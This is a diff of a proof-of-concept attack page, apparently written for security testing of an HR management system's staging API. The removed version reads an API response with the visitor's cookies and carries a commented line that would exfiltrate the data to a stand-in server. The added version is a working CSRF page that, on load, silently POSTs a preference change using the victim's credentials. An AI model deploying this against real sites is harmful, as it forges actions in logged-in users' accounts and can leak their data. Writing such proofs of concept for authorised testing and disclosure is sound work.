@@ -1,11 +1,36 @@
-<script>
-fetch("https://api.stg.hrms.powerschoolcorp.com/svc/hrms-api/widget/quicklinks", {
-  credentials: "include"
-})
-.then(r => r.text())
-.then(data => {
-  document.body.innerText = "Response: " + data;
-  // or exfiltrate: fetch("https://your-server.com/log?data=" + btoa(data));
-})
-.catch(e => document.body.innerText = "Error: " + e);
-</script>
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>CSRF PoC — mychecklistprogress userpreferences</title>
+    <style>
+      body { font-family: system-ui, sans-serif; padding: 24px; }
+      code { background: #f4f4f4; padding: 2px 6px; border-radius: 4px; }
+    </style>
+  </head>
+  <body>
+    <h1>CSRF PoC</h1>
+    <p>If you’re logged into <code>api.stg.hrms.ctf.com</code>, this page will try to POST the payload using your cookies.</p>
+
+    <script>
+      (function attack() {
+        const url = "https://api.stg.hrms.powerschoolcorp.com/svc/hrms-api/widget/mychecklistprogress/settings/userpreferences";
+        const body = JSON.stringify({
+          UserPreferences: { WidgetId: 19, Title: "My Checklzzzist Progresstestssss", SortBy: "42" }
+        });
+
+        // Fire-and-forget CSRF request
+        fetch(url, {
+          method: "POST",
+          mode: "no-cors",          // makes it a “opaque” request; response unreadable, but cookies are sent
+          credentials: "include",   // include victim’s cookies
+          headers: {
+            "Content-Type": "text/plain;charset=UTF-8",
+            "Accept": "*/*"
+          },
+          body
+        }).catch(() => { /* ignore */ });
+      })();
+    </script>
+  </body>
+</html>
